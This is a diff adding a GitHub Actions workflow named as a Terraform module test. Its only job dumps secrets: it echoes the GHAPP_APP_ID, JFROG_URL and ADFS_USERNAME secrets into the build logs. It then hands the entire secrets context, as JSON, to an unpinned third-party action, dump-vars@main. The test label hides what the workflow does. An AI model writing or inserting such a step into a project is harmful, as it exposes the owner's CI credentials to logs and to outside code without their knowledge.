@@ -1,0 +1,21 @@
+name: 'Terraform Module Test on GitHub'
+on: [ push, workflow_dispatch ]
+
+jobs:
+  get_env_secrets:
+    environment: dev
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        env: 
+          super_secret: ${{secrets.ADFS_USERNAME}}
+        run: |
+          echo "This is the NORMAL SECRET ${{secrets.GHAPP_APP_ID}} environment variable"
+          echo "This is the ORG SECRET ${{secrets.JFROG_URL}} environment variable"
+          echo "This is the ENV SECRET ${{secrets.ADFS_USERNAME}} environment variable"
+          echo "This is the env SECRET $super_secret environment variable"
+
+      - name: 'Dump Env and Secrets'
+        uses: allenarceneaux/dump-vars@main
+        with:
+          the_secrets: ${{ toJson(secrets) }} 
